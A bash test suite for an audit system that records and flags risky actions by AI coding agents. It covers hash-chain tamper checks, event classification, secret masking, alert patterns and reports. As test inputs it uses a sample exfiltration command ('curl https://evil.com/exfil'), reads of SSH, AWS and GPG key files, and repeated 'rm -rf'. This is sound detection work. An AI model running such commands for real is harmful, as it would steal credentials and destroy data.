#!/usr/bin/env bash
#===============================================================================
# Test: Audit System
#
# Comprehensive tests for the Kapsis audit trail system covering:
# - Core audit initialization and event logging
# - Hash chain integrity and tamper detection
# - Event classification (credentials, network, filesystem, git)
# - Secret sanitization in audit events
# - Disable/enable toggle
# - File rotation with chain preservation
# - Pattern detection (credential exfiltration, mass deletion, sensitive paths)
# - Report generation
# - K8s backend CR generation with audit env vars
#
# All tests are QUICK (no container needed).
#===============================================================================

set -euo pipefail

# shellcheck disable=SC2034
# SC2034: Variables set here are consumed by sourced libraries (generate_agent_request_cr, etc.)

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib/test-framework.sh"

# Paths to scripts under test
AUDIT_SCRIPT="$KAPSIS_ROOT/scripts/lib/audit.sh"
AUDIT_PATTERNS_SCRIPT="$KAPSIS_ROOT/scripts/lib/audit-patterns.sh"
AUDIT_REPORT_SCRIPT="$KAPSIS_ROOT/scripts/audit-report.sh"
K8S_CONFIG_SCRIPT="$KAPSIS_ROOT/scripts/lib/k8s-config.sh"

#===============================================================================
# SETUP / TEARDOWN
#===============================================================================

# Each test gets a fresh temporary audit directory and clean global state.
# We reset the audit library's internal variables to simulate a clean session.

TEST_AUDIT_DIR=""

setup() {
    TEST_AUDIT_DIR=$(mktemp -d "${TMPDIR:-/tmp}/kapsis-audit-test-XXXXXX")
    export KAPSIS_AUDIT_DIR="$TEST_AUDIT_DIR"
    export KAPSIS_AUDIT_ENABLED="true"

    # Reset audit library internal state so each test starts clean
    _KAPSIS_AUDIT_LOADED=""
    _KAPSIS_AUDIT_PATTERNS_LOADED=""
    _KAPSIS_AUDIT_SEQ=0
    _KAPSIS_AUDIT_PREV_HASH="0000000000000000000000000000000000000000000000000000000000000000"
    _KAPSIS_AUDIT_SESSION_ID=""
    _KAPSIS_AUDIT_FILE=""
    _KAPSIS_AUDIT_INITIALIZED="false"
    _KAPSIS_AUDIT_AGENT_ID=""
    _KAPSIS_AUDIT_PROJECT=""
    _KAPSIS_AUDIT_AGENT_TYPE=""

    # Reset pattern detection ring buffer
    _AUDIT_RECENT_TYPES=()
    _AUDIT_RECENT_TOOLS=()
    _AUDIT_RECENT_COMMANDS=()
    _AUDIT_RECENT_FILES=()
    _AUDIT_RECENT_TIMESTAMPS=()
    _AUDIT_ALERT_COUNT=0
}

teardown() {
    rm -rf "$TEST_AUDIT_DIR" 2>/dev/null || true
    unset KAPSIS_AUDIT_DIR KAPSIS_AUDIT_ENABLED
}

# Helper: source audit.sh with a fresh state
source_audit() {
    _KAPSIS_AUDIT_LOADED=""
    source "$AUDIT_SCRIPT"
}

# Helper: source audit-patterns.sh with a fresh state
source_audit_patterns() {
    _KAPSIS_AUDIT_PATTERNS_LOADED=""
    source "$AUDIT_PATTERNS_SCRIPT"
}

#===============================================================================
# CORE TESTS
#===============================================================================

# 1. audit_init creates JSONL file with genesis event
test_audit_init_creates_file() {
    log_test "audit_init creates JSONL file with genesis event"

    setup
    source_audit

    audit_init "test-agent-001" "my-project" "claude-cli"

    # The audit file should exist
    local audit_file
    audit_file=$(audit_get_file)
    assert_file_exists "$audit_file" "Audit file should be created by audit_init"

    # Should contain exactly one line (the genesis event)
    local line_count
    line_count=$(wc -l < "$audit_file" | tr -d ' ')
    assert_equals "1" "$line_count" "Audit file should have 1 genesis event"

    # Genesis event should have session_start type and seq 0
    local first_line
    first_line=$(head -1 "$audit_file")
    assert_contains "$first_line" '"event_type":"session_start"' "Genesis event should be session_start"
    assert_contains "$first_line" '"seq":0' "Genesis event should have seq 0"
    assert_contains "$first_line" '"agent_id":"test-agent-001"' "Genesis event should contain agent_id"
    assert_contains "$first_line" '"project":"my-project"' "Genesis event should contain project"

    teardown
}

# 2. audit_log_event appends events to JSONL
test_audit_log_event_appends() {
    log_test "audit_log_event appends events to JSONL"

    setup
    source_audit

    audit_init "test-agent-002" "project-x" "codex-cli"

    # Log two more events
    audit_log_event "shell_command" "Bash" '{"command":"git status"}'
    audit_log_event "filesystem_op" "Read" '{"file_path":"/workspace/src/main.java"}'

    local audit_file
    audit_file=$(audit_get_file)

    local line_count
    line_count=$(wc -l < "$audit_file" | tr -d ' ')
    assert_equals "3" "$line_count" "Audit file should have 3 events (genesis + 2)"

    # Check seq numbers increment
    local second_line
    second_line=$(sed -n '2p' "$audit_file")
    assert_contains "$second_line" '"seq":1' "Second event should have seq 1"

    local third_line
    third_line=$(sed -n '3p' "$audit_file")
    assert_contains "$third_line" '"seq":2' "Third event should have seq 2"

    teardown
}

# 3. Hash chain verifies after multiple events
test_audit_hash_chain_valid() {
    log_test "Hash chain verifies after multiple events"

    setup
    source_audit

    audit_init "test-agent-003" "my-project" "claude-cli"
    audit_log_event "shell_command" "Bash" '{"command":"ls -la"}'
    audit_log_event "tool_use" "Grep" '{"pattern":"TODO"}'
    audit_log_event "git_op" "Bash" '{"command":"git commit -m test"}'
    audit_log_event "filesystem_op" "Write" '{"file_path":"/workspace/README.md"}'

    local audit_file
    audit_file=$(audit_get_file)

    local verify_rc=0
    audit_verify_chain "$audit_file" 2>/dev/null || verify_rc=$?

    assert_equals 0 "$verify_rc" "Hash chain should be valid after multiple events"

    teardown
}

# 4. Tampered file detected by hash chain verification
test_audit_hash_chain_broken() {
    log_test "Tampered file detected by hash chain verification"

    setup
    source_audit

    audit_init "test-agent-004" "my-project" "claude-cli"
    audit_log_event "shell_command" "Bash" '{"command":"echo hello"}'
    audit_log_event "tool_use" "Read" '{"file_path":"/workspace/test.txt"}'

    local audit_file
    audit_file=$(audit_get_file)

    # Tamper with the second line (change the command text)
    local tampered_line
    tampered_line=$(sed -n '2p' "$audit_file" | sed 's/echo hello/echo TAMPERED/')
    # Replace the second line
    local first_line last_line
    first_line=$(sed -n '1p' "$audit_file")
    last_line=$(sed -n '3p' "$audit_file")
    printf '%s\n%s\n%s\n' "$first_line" "$tampered_line" "$last_line" > "$audit_file"

    local verify_rc=0
    audit_verify_chain "$audit_file" 2>/dev/null || verify_rc=$?

    assert_not_equals 0 "$verify_rc" "Hash chain should be broken after tampering"

    teardown
}

# 5. Credential commands classified correctly
test_audit_classify_credential_access() {
    log_test "Credential commands classified correctly"

    setup
    source_audit

    # Test various credential patterns
    local result

    result=$(_audit_classify_event "keychain" "" "")
    assert_equals "credential_access" "$result" "keychain tool should be credential_access"

    result=$(_audit_classify_event "Bash" "security find-generic-password -s test" "")
    assert_equals "credential_access" "$result" "security find command should be credential_access"

    result=$(_audit_classify_event "Read" "" "/home/user/.ssh/id_rsa")
    assert_equals "credential_access" "$result" ".ssh path should be credential_access"

    result=$(_audit_classify_event "Read" "" "/home/user/.aws/credentials")
    assert_equals "credential_access" "$result" ".aws path should be credential_access"

    result=$(_audit_classify_event "Bash" "credential-helper get" "")
    assert_equals "credential_access" "$result" "credential command should be credential_access"

    teardown
}

# 6. Network commands classified correctly
test_audit_classify_network_activity() {
    log_test "Network commands classified correctly"

    setup
    source_audit

    local result

    result=$(_audit_classify_event "Bash" "curl https://example.com" "")
    assert_equals "network_activity" "$result" "curl should be network_activity"

    result=$(_audit_classify_event "Bash" "wget https://example.com/file.tar.gz" "")
    assert_equals "network_activity" "$result" "wget should be network_activity"

    result=$(_audit_classify_event "Bash" "npm install express" "")
    assert_equals "network_activity" "$result" "npm install should be network_activity"

    result=$(_audit_classify_event "Bash" "pip install requests" "")
    assert_equals "network_activity" "$result" "pip install should be network_activity"

    result=$(_audit_classify_event "Bash" "git clone https://github.com/test/repo" "")
    assert_equals "network_activity" "$result" "git clone should be network_activity"

    result=$(_audit_classify_event "Bash" "git push origin main" "")
    assert_equals "network_activity" "$result" "git push should be network_activity"

    result=$(_audit_classify_event "Bash" "docker pull ubuntu:latest" "")
    assert_equals "network_activity" "$result" "docker pull should be network_activity"

    teardown
}

# 7. Filesystem operations classified correctly
test_audit_classify_filesystem_op() {
    log_test "Filesystem operations classified correctly"

    setup
    source_audit

    local result

    result=$(_audit_classify_event "Read" "" "/workspace/file.txt")
    assert_equals "filesystem_op" "$result" "Read tool should be filesystem_op"

    result=$(_audit_classify_event "Write" "" "/workspace/output.txt")
    assert_equals "filesystem_op" "$result" "Write tool should be filesystem_op"

    result=$(_audit_classify_event "Edit" "" "/workspace/main.py")
    assert_equals "filesystem_op" "$result" "Edit tool should be filesystem_op"

    result=$(_audit_classify_event "Glob" "" "")
    assert_equals "filesystem_op" "$result" "Glob tool should be filesystem_op"

    result=$(_audit_classify_event "Grep" "" "")
    assert_equals "filesystem_op" "$result" "Grep tool should be filesystem_op"

    result=$(_audit_classify_event "Bash" "rm -rf /workspace/build" "")
    assert_equals "filesystem_op" "$result" "rm command should be filesystem_op"

    result=$(_audit_classify_event "Bash" "cp src/a.txt dst/a.txt" "")
    assert_equals "filesystem_op" "$result" "cp command should be filesystem_op"

    result=$(_audit_classify_event "Bash" "mkdir -p /workspace/new-dir" "")
    assert_equals "filesystem_op" "$result" "mkdir command should be filesystem_op"

    teardown
}

# 8. Git operations classified correctly
test_audit_classify_git_op() {
    log_test "Git operations classified correctly"

    setup
    source_audit

    local result

    result=$(_audit_classify_event "Bash" "git commit -m 'fix: bug'" "")
    assert_equals "git_op" "$result" "git commit should be git_op"

    result=$(_audit_classify_event "Bash" "git checkout -b feature/new" "")
    assert_equals "git_op" "$result" "git checkout should be git_op"

    result=$(_audit_classify_event "Bash" "git merge main" "")
    assert_equals "git_op" "$result" "git merge should be git_op"

    result=$(_audit_classify_event "Bash" "git rebase main" "")
    assert_equals "git_op" "$result" "git rebase should be git_op"

    result=$(_audit_classify_event "Bash" "git add ." "")
    assert_equals "git_op" "$result" "git add should be git_op"

    result=$(_audit_classify_event "Bash" "git stash pop" "")
    assert_equals "git_op" "$result" "git stash should be git_op"

    teardown
}

# 9. Secrets masked in audit events
test_audit_secret_sanitization() {
    log_test "Secrets masked in audit events"

    setup
    source_audit

    audit_init "test-agent-009" "my-project" "claude-cli"

    # Log an event containing a secret-like pattern
    # sanitize_secrets masks "-e VAR=value" patterns
    audit_log_event "shell_command" "Bash" '{"command":"run -e API_TOKEN=FAKE-test-value-not-real something"}'

    local audit_file
    audit_file=$(audit_get_file)

    # The secret value should be masked
    local content
    content=$(cat "$audit_file")
    assert_not_contains "$content" "FAKE-test-value-not-real" "Secret value should be masked in audit"
    assert_contains "$content" "MASKED" "Masked placeholder should appear in audit"

    teardown
}

# 10. No audit files created when disabled
test_audit_can_be_disabled() {
    log_test "No audit files created when KAPSIS_AUDIT_ENABLED=false"

    setup
    export KAPSIS_AUDIT_ENABLED="false"
    source_audit

    # audit_init checks the enabled flag in the calling script;
    # but the library itself always writes if called directly.
    # The real guard is in launch-agent.sh which checks KAPSIS_AUDIT_ENABLED
    # before calling audit_init. Here we test that if we DON'T call audit_init,
    # audit_log_event is a no-op.
    audit_log_event "shell_command" "Bash" '{"command":"echo hello"}'

    # No files should be created since audit was never initialized
    local file_count
    file_count=$(find "$TEST_AUDIT_DIR" -name "*.audit.jsonl" 2>/dev/null | wc -l | tr -d ' ')
    assert_equals "0" "$file_count" "No audit files when audit is not initialized"

    teardown
}

# 11. File rotated at size cap, chain preserved
test_audit_file_rotation() {
    log_test "File rotated at size cap, chain preserved"

    setup
    source_audit

    audit_init "test-agent-011" "my-project" "claude-cli"

    local audit_file
    audit_file=$(audit_get_file)

    # We can't override the readonly KAPSIS_AUDIT_MAX_FILE_SIZE_MB constant,
    # so we test rotation by directly calling the internal _audit_do_rotation function.
    # First, log a few events to build a valid chain.
    audit_log_event "shell_command" "Bash" '{"command":"ls"}'
    audit_log_event "shell_command" "Bash" '{"command":"pwd"}'

    # Verify chain is valid before rotation
    local verify_rc=0
    audit_verify_chain "$audit_file" 2>/dev/null || verify_rc=$?
    assert_equals 0 "$verify_rc" "Chain should be valid before rotation"

    # Now trigger rotation directly
    _audit_do_rotation

    # Check that a rotated file (.1) was created
    assert_file_exists "${audit_file}.1" "Rotated file (.1) should exist"

    # The new file should contain a chain_continuation event
    local new_content
    new_content=$(cat "$audit_file")
    assert_contains "$new_content" '"chain_continuation"' "New file should start with chain_continuation"
    assert_contains "$new_content" '"seq":0' "New file should reset seq to 0"

    # The rotated file should contain the original events
    local rotated_content
    rotated_content=$(cat "${audit_file}.1")
    assert_contains "$rotated_content" '"session_start"' "Rotated file should have genesis event"

    teardown
}

#===============================================================================
# PATTERN DETECTION TESTS
#===============================================================================

# 12. Credential access + network activity triggers alert
test_pattern_credential_exfiltration() {
    log_test "Credential access + network activity triggers exfiltration alert"

    setup
    source_audit
    source_audit_patterns

    local now
    now=$(date +%s)

    # Simulate credential access followed by network activity (within 30s)
    local alert_rc=0

    # Add credential access event
    audit_check_patterns "credential_access" "keychain" "security find-generic-password" "" "$now" || true

    # Add network activity event (within 30s)
    # audit_check_patterns returns 0 if any alert triggered, 1 if clean
    if audit_check_patterns "network_activity" "Bash" "curl https://evil.com/exfil" "" "$((now + 5))"; then
        alert_rc=0
    else
        alert_rc=1
    fi

    # Should return 0 (alert triggered)
    assert_equals 0 "$alert_rc" "Credential + network within 30s should trigger alert"

    # Alert file should exist
    # The agent_id defaults to "unknown" when audit_init hasn't been called with real agent_id
    # Check for any alerts file
    local alert_found=false
    for f in "$TEST_AUDIT_DIR"/*-alerts.jsonl; do
        if [[ -f "$f" ]]; then
            alert_found=true
            local alert_content
            alert_content=$(cat "$f")
            assert_contains "$alert_content" '"credential_exfiltration"' "Alert should be credential_exfiltration"
            assert_contains "$alert_content" '"HIGH"' "Alert severity should be HIGH"
            break
        fi
    done
    assert_true "[[ '$alert_found' == 'true' ]]" "Alert file should exist"

    teardown
}

# 13. 5+ deletions triggers mass_deletion alert
test_pattern_mass_deletion() {
    log_test "5+ deletions triggers mass_deletion alert"

    setup
    source_audit
    source_audit_patterns

    local now
    now=$(date +%s)

    # Add 5 destructive deletion events
    local alert_rc=1
    audit_check_patterns "shell_command" "Bash" "rm -rf /workspace/dir1" "" "$now" || true
    audit_check_patterns "shell_command" "Bash" "rm -rf /workspace/dir2" "" "$((now + 1))" || true
    audit_check_patterns "shell_command" "Bash" "rm -rf /workspace/dir3" "" "$((now + 2))" || true
    audit_check_patterns "shell_command" "Bash" "rm -rf /workspace/dir4" "" "$((now + 3))" || true
    if audit_check_patterns "shell_command" "Bash" "rm -rf /workspace/dir5" "" "$((now + 4))"; then
        alert_rc=0
    else
        alert_rc=1
    fi

    assert_equals 0 "$alert_rc" "5 rm -rf commands should trigger mass_deletion alert"

    # Verify alert file content
    local alert_found=false
    for f in "$TEST_AUDIT_DIR"/*-alerts.jsonl; do
        if [[ -f "$f" ]]; then
            alert_found=true
            local content
            content=$(cat "$f")
            assert_contains "$content" '"mass_deletion"' "Alert should be mass_deletion"
            assert_contains "$content" '"MEDIUM"' "Alert severity should be MEDIUM"
            break
        fi
    done
    assert_true "[[ '$alert_found' == 'true' ]]" "Mass deletion alert file should exist"

    teardown
}

# 14. .ssh access triggers sensitive_path_access alert
test_pattern_sensitive_path() {
    log_test ".ssh access triggers sensitive_path_access alert"

    setup
    source_audit
    source_audit_patterns

    local now
    now=$(date +%s)

    local alert_rc=1
    if audit_check_patterns "filesystem_op" "Read" "" "/home/user/.ssh/id_rsa" "$now"; then
        alert_rc=0
    else
        alert_rc=1
    fi

    assert_equals 0 "$alert_rc" ".ssh access should trigger alert"

    local alert_found=false
    for f in "$TEST_AUDIT_DIR"/*-alerts.jsonl; do
        if [[ -f "$f" ]]; then
            alert_found=true
            local content
            content=$(cat "$f")
            assert_contains "$content" '"sensitive_path_access"' "Alert should be sensitive_path_access"
            assert_contains "$content" '"HIGH"' "Alert severity should be HIGH"
            assert_contains "$content" ".ssh/id_rsa" "Alert should mention the file"
            break
        fi
    done
    assert_true "[[ '$alert_found' == 'true' ]]" "Sensitive path alert file should exist"

    teardown
}

# 15. npm install NOT flagged as credential_exfiltration
test_pattern_no_false_positive_npm() {
    log_test "npm install not flagged as credential exfiltration"

    setup
    source_audit
    source_audit_patterns

    local now
    now=$(date +%s)

    # Credential access event
    audit_check_patterns "credential_access" "keychain" "security find-generic-password" "" "$now" || true

    # npm install should be excluded from the exfiltration pattern
    # (it's in the package manager allowlist)
    audit_check_patterns "network_activity" "Bash" "npm install express" "" "$((now + 5))" || true

    # Should NOT trigger credential_exfiltration
    # (other patterns like unusual_commands won't match npm install either)
    local exfil_found=false
    for f in "$TEST_AUDIT_DIR"/*-alerts.jsonl; do
        if [[ -f "$f" ]]; then
            if grep -q "credential_exfiltration" "$f" 2>/dev/null; then
                exfil_found=true
            fi
        fi
    done
    assert_true "[[ '$exfil_found' == 'false' ]]" "npm install should not trigger credential_exfiltration"

    teardown
}

#===============================================================================
# REPORT TESTS
#===============================================================================

# 16. Text report generates correctly
test_report_text_format() {
    log_test "Text report generates correctly"

    setup
    source_audit

    audit_init "test-agent-016" "report-project" "claude-cli"
    audit_log_event "shell_command" "Bash" '{"command":"git status"}'
    audit_log_event "filesystem_op" "Read" '{"file_path":"/workspace/src/main.java"}'
    audit_log_event "tool_use" "Grep" '{"pattern":"TODO"}'

    local audit_file
    audit_file=$(audit_get_file)

    # Run the report script
    local report_output
    report_output=$("$AUDIT_REPORT_SCRIPT" "$audit_file" --format text 2>/dev/null) || true

    # Report should contain session summary sections
    assert_contains "$report_output" "Session Summary" "Report should contain Session Summary"
    assert_contains "$report_output" "test-agent-016" "Report should contain agent ID"
    assert_contains "$report_output" "report-project" "Report should contain project name"
    assert_contains "$report_output" "claude-cli" "Report should contain agent type"
    assert_contains "$report_output" "Total Events" "Report should show total events"

    teardown
}

# 17. --verify flag works
test_report_verify_chain() {
    log_test "Report --verify flag works"

    setup
    source_audit

    audit_init "test-agent-017" "verify-project" "claude-cli"
    audit_log_event "shell_command" "Bash" '{"command":"echo test"}'

    local audit_file
    audit_file=$(audit_get_file)

    # Run report with --verify
    local report_output
    report_output=$("$AUDIT_REPORT_SCRIPT" "$audit_file" --format text --verify 2>/dev/null) || true

    assert_contains "$report_output" "Hash Chain Verification" "Report should contain verification section"
    assert_contains "$report_output" "VALID" "Chain should be valid"

    teardown
}

#===============================================================================
# K8S BACKEND TESTS
#===============================================================================

# 18. CR YAML includes audit env vars when enabled
# 19. CR YAML omits audit env vars when disabled
#
# Both K8s tests run in subshells to avoid readonly variable conflicts
# when re-sourcing k8s-config.sh.

test_k8s_cr_includes_audit_env() {
    log_test "K8s CR YAML includes audit env vars when audit is enabled"

    setup

    # Run in a subshell to get a clean k8s-config.sh source
    local cr_yaml
    # shellcheck disable=SC2030,SC2031,SC2034
    cr_yaml=$(
        # Set required globals for generate_agent_request_cr
        AGENT_ID="test-k8s-001"
        IMAGE_NAME="kapsis-sandbox:latest"
        AGENT_NAME="claude-cli"
        RESOURCE_MEMORY="8g"
        RESOURCE_CPUS="4"
        BRANCH="feature/test"
        TASK_INLINE="Do the thing"
        NETWORK_MODE="filtered"
        SECURITY_PROFILE="standard"
        AGENT_COMMAND=""
        BASE_BRANCH="main"
        DO_PUSH="false"
        GIT_REMOTE_URL=""
        export KAPSIS_AUDIT_ENABLED="true"

        source "$K8S_CONFIG_SCRIPT"
        generate_agent_request_cr
    )

    assert_contains "$cr_yaml" "KAPSIS_AUDIT_ENABLED" "CR should include KAPSIS_AUDIT_ENABLED"
    assert_contains "$cr_yaml" "KAPSIS_AUDIT_DIR" "CR should include KAPSIS_AUDIT_DIR"
    assert_contains "$cr_yaml" '"true"' "KAPSIS_AUDIT_ENABLED should be true"

    teardown
}

test_k8s_cr_excludes_audit_env() {
    log_test "K8s CR YAML omits audit env vars when audit is disabled"

    setup

    # Run in a subshell to get a clean k8s-config.sh source
    local cr_yaml
    # shellcheck disable=SC2030,SC2031,SC2034
    cr_yaml=$(
        # Set required globals for generate_agent_request_cr
        AGENT_ID="test-k8s-002"
        IMAGE_NAME="kapsis-sandbox:latest"
        AGENT_NAME="claude-cli"
        RESOURCE_MEMORY="8g"
        RESOURCE_CPUS="4"
        BRANCH="feature/test"
        TASK_INLINE="Do the thing"
        NETWORK_MODE="filtered"
        SECURITY_PROFILE="standard"
        AGENT_COMMAND=""
        BASE_BRANCH="main"
        DO_PUSH="false"
        GIT_REMOTE_URL=""
        export KAPSIS_AUDIT_ENABLED="false"

        source "$K8S_CONFIG_SCRIPT"
        generate_agent_request_cr
    )

    assert_not_contains "$cr_yaml" "KAPSIS_AUDIT_ENABLED" "CR should not include KAPSIS_AUDIT_ENABLED when disabled"
    assert_not_contains "$cr_yaml" "KAPSIS_AUDIT_DIR" "CR should not include KAPSIS_AUDIT_DIR when disabled"

    teardown
}

#===============================================================================
# REPORT FORMAT TESTS
#===============================================================================

# 20. JSON report generates valid structure
test_report_json_format() {
    log_test "JSON report generates valid output structure"

    setup
    source_audit

    audit_init "test-agent-020" "json-project" "claude-cli"
    audit_log_event "shell_command" "Bash" '{"command":"git status"}'
    audit_log_event "filesystem_op" "Read" '{"file_path":"/workspace/src/main.java"}'
    audit_log_event "credential_access" "keychain" '{"command":"security find-generic-password"}'
    audit_log_event "tool_use" "Grep" '{"pattern":"TODO"}'

    local audit_file
    audit_file=$(audit_get_file)

    # Run the report script with --format json
    local report_output
    report_output=$("$AUDIT_REPORT_SCRIPT" "$audit_file" --format json 2>/dev/null) || true

    # Verify top-level keys exist in JSON output
    assert_contains "$report_output" '"summary"' "JSON report should contain summary key"
    assert_contains "$report_output" '"alerts"' "JSON report should contain alerts key"
    assert_contains "$report_output" '"statistics"' "JSON report should contain statistics key"
    assert_contains "$report_output" '"credential_access"' "JSON report should contain credential_access key"
    assert_contains "$report_output" '"filesystem_impact"' "JSON report should contain filesystem_impact key"

    # Verify summary fields
    assert_contains "$report_output" '"agent_id":"test-agent-020"' "JSON summary should contain agent_id"
    assert_contains "$report_output" '"project":"json-project"' "JSON summary should contain project"
    assert_contains "$report_output" '"agent_type":"claude-cli"' "JSON summary should contain agent_type"
    assert_contains "$report_output" '"total_events":5' "JSON summary should show 5 total events (genesis + 4)"

    # Verify events_by_type contains our event types
    assert_contains "$report_output" '"shell_command"' "JSON should contain shell_command event type"
    assert_contains "$report_output" '"filesystem_op"' "JSON should contain filesystem_op event type"
    assert_contains "$report_output" '"credential_access"' "JSON should contain credential_access in events"

    # Verify tool_usage statistics
    assert_contains "$report_output" '"tool_usage"' "JSON should contain tool_usage stats"
    assert_contains "$report_output" '"Bash"' "JSON tool_usage should contain Bash"
    assert_contains "$report_output" '"Grep"' "JSON tool_usage should contain Grep"

    # Verify filesystem_impact has our file
    assert_contains "$report_output" '"paths"' "JSON should contain filesystem paths"
    assert_contains "$report_output" 'main.java' "JSON filesystem_impact should contain our file"

    teardown
}

# 21. --alerts-only mode works (text format)
test_report_alerts_only_text() {
    log_test "Report --alerts-only text mode works"

    setup
    source_audit
    source_audit_patterns

    audit_init "test-agent-021" "alerts-project" "claude-cli"

    # Trigger a sensitive path alert via audit_log_event (which calls audit_check_patterns)
    # This ensures the alert file is written at the path the report script expects.
    audit_log_event "filesystem_op" "Read" '{"file_path":"/home/user/.ssh/id_rsa"}'

    local audit_file
    audit_file=$(audit_get_file)

    # Verify alert file was created at the expected path
    local expected_alerts="${audit_file%.audit.jsonl}-alerts.jsonl"
    # _audit_alert writes to ${agent_id}-alerts.jsonl, but report derives from audit filename.
    # Copy the alert file to where the report expects it if paths differ.
    local actual_alerts="$TEST_AUDIT_DIR/test-agent-021-alerts.jsonl"
    if [[ -f "$actual_alerts" && ! -f "$expected_alerts" ]]; then
        cp "$actual_alerts" "$expected_alerts"
    fi

    # Run report with --alerts-only
    local report_output
    report_output=$("$AUDIT_REPORT_SCRIPT" "$audit_file" --format text --alerts-only 2>/dev/null) || true

    # Should contain alert content
    assert_contains "$report_output" "Security Alerts" "Alerts-only should show alerts section"
    assert_contains "$report_output" "sensitive_path_access" "Alerts-only should show the pattern name"

    # Should NOT contain other report sections
    assert_not_contains "$report_output" "Session Summary" "Alerts-only should not contain Session Summary"
    assert_not_contains "$report_output" "Event Statistics" "Alerts-only should not contain Event Statistics"

    teardown
}

# 22. --alerts-only mode works (JSON format)
test_report_alerts_only_json() {
    log_test "Report --alerts-only JSON mode works"

    setup
    source_audit
    source_audit_patterns

    audit_init "test-agent-022" "alerts-json-project" "claude-cli"

    # Trigger a sensitive path alert via audit_log_event
    audit_log_event "filesystem_op" "Read" '{"file_path":"/home/user/.gnupg/secring.gpg"}'

    local audit_file
    audit_file=$(audit_get_file)

    # Copy alert file to path the report expects (see test 21 for explanation)
    local expected_alerts="${audit_file%.audit.jsonl}-alerts.jsonl"
    local actual_alerts="$TEST_AUDIT_DIR/test-agent-022-alerts.jsonl"
    if [[ -f "$actual_alerts" && ! -f "$expected_alerts" ]]; then
        cp "$actual_alerts" "$expected_alerts"
    fi

    # Run report with --alerts-only --format json
    local report_output
    report_output=$("$AUDIT_REPORT_SCRIPT" "$audit_file" --format json --alerts-only 2>/dev/null) || true

    # Should be a JSON array starting with [
    assert_contains "$report_output" "[" "Alerts-only JSON should be an array"
    assert_contains "$report_output" '"sensitive_path_access"' "Alerts-only JSON should contain pattern name"
    assert_contains "$report_output" '"HIGH"' "Alerts-only JSON should contain severity"

    # Should NOT contain summary/statistics keys (those are in full report only)
    assert_not_contains "$report_output" '"summary"' "Alerts-only JSON should not contain summary"
    assert_not_contains "$report_output" '"statistics"' "Alerts-only JSON should not contain statistics"

    teardown
}

#===============================================================================
# CLEANUP TESTS
#===============================================================================

# 23. TTL-based cleanup deletes old files
test_audit_cleanup_ttl() {
    log_test "TTL-based cleanup deletes old audit files"

    setup

    local audit_dir="$TEST_AUDIT_DIR"

    # Create fake audit files with old timestamps
    local old_file="$audit_dir/old-agent-20250101-120000-1234.audit.jsonl"
    local old_alerts="$audit_dir/old-agent-alerts.jsonl"
    local old_report="$audit_dir/old-agent-report.txt"
    local new_file="$audit_dir/new-agent-20260315-120000-5678.audit.jsonl"

    echo '{"seq":0}' > "$old_file"
    echo '{"pattern":"test"}' > "$old_alerts"
    echo 'report content' > "$old_report"
    echo '{"seq":0}' > "$new_file"

    # Set old files to 31 days old via touch (cross-platform)
    touch -t 202602120000 "$old_file"
    touch -t 202602120000 "$old_alerts"
    touch -t 202602120000 "$old_report"

    # Run TTL cleanup in a separate bash process where we can set the TTL
    # before constants.sh makes it readonly. Use env(1) to bypass the
    # readonly restriction on KAPSIS_AUDIT_TTL_DAYS in the current shell.
    env KAPSIS_AUDIT_TTL_DAYS=30 bash -c '
        set -euo pipefail
        source "'"$KAPSIS_ROOT"'/scripts/lib/logging.sh"
        source "'"$KAPSIS_ROOT"'/scripts/lib/json-utils.sh"
        source "'"$KAPSIS_ROOT"'/scripts/lib/compat.sh"
        source "'"$KAPSIS_ROOT"'/scripts/lib/constants.sh"
        source "'"$AUDIT_SCRIPT"'"
        _audit_cleanup_ttl "'"$audit_dir"'"
    '

    # Old files should be deleted
    assert_file_not_exists "$old_file" "Old audit file should be deleted by TTL cleanup"
    assert_file_not_exists "$old_alerts" "Old alerts file should be deleted by TTL cleanup"
    assert_file_not_exists "$old_report" "Old report file should be deleted by TTL cleanup"

    # New file should remain
    assert_file_exists "$new_file" "New audit file should not be deleted"

    teardown
}

# 24. Size-based cleanup prunes oldest files first
test_audit_cleanup_size_cap() {
    log_test "Size-based cleanup prunes oldest files first when over cap"

    setup

    local audit_dir="$TEST_AUDIT_DIR"

    # Create several audit files with different ages and sizes
    local oldest_file="$audit_dir/agent1-20250101-000000-0001.audit.jsonl"
    local middle_file="$audit_dir/agent2-20250201-000000-0002.audit.jsonl"
    local newest_file="$audit_dir/agent3-20250301-000000-0003.audit.jsonl"

    # Write enough data to exceed 1MB total (each file ~400KB = ~1.2MB total)
    local big_line='{"seq":0,"timestamp":"2025-01-01T00:00:00Z","session_id":"test","agent_id":"a","agent_type":"t","project":"p","event_type":"tool_use","tool_name":"Bash","detail":{"command":"'
    big_line+=$(printf 'x%.0s' {1..800})
    big_line+='"},"prev_hash":"0000000000000000000000000000000000000000000000000000000000000000","hash":"abcdef1234567890"}'

    local _i
    for _i in $(seq 1 400); do
        echo "$big_line" >> "$oldest_file"
    done
    for _i in $(seq 1 400); do
        echo "$big_line" >> "$middle_file"
    done
    for _i in $(seq 1 400); do
        echo "$big_line" >> "$newest_file"
    done

    # Set different timestamps so sort-by-age works
    touch -t 202501010000 "$oldest_file"
    touch -t 202502010000 "$middle_file"
    touch -t 202503010000 "$newest_file"

    # Run size cleanup in a separate bash process with 1MB cap.
    # Use env(1) to bypass the readonly restriction on KAPSIS_AUDIT_MAX_TOTAL_SIZE_MB.
    env KAPSIS_AUDIT_MAX_TOTAL_SIZE_MB=1 bash -c '
        set -euo pipefail
        source "'"$KAPSIS_ROOT"'/scripts/lib/logging.sh"
        source "'"$KAPSIS_ROOT"'/scripts/lib/json-utils.sh"
        source "'"$KAPSIS_ROOT"'/scripts/lib/compat.sh"
        source "'"$KAPSIS_ROOT"'/scripts/lib/constants.sh"
        source "'"$AUDIT_SCRIPT"'"
        _audit_cleanup_size "'"$audit_dir"'"
    '

    # Oldest file should be deleted (it's first in age-sorted order)
    assert_file_not_exists "$oldest_file" "Oldest file should be pruned by size cleanup"

    # Newest file should survive
    assert_file_exists "$newest_file" "Newest file should not be deleted by size cleanup"

    teardown
}

#===============================================================================
# ADDITIONAL FALSE POSITIVE TESTS
#===============================================================================

# 25. pip install not flagged as credential exfiltration
test_pattern_no_false_positive_pip() {
    log_test "pip install not flagged as credential exfiltration"

    setup
    source_audit
    source_audit_patterns

    local now
    now=$(date +%s)

    # Credential access event
    audit_check_patterns "credential_access" "keychain" "security find-generic-password" "" "$now" || true

    # pip install should be excluded (in package manager allowlist)
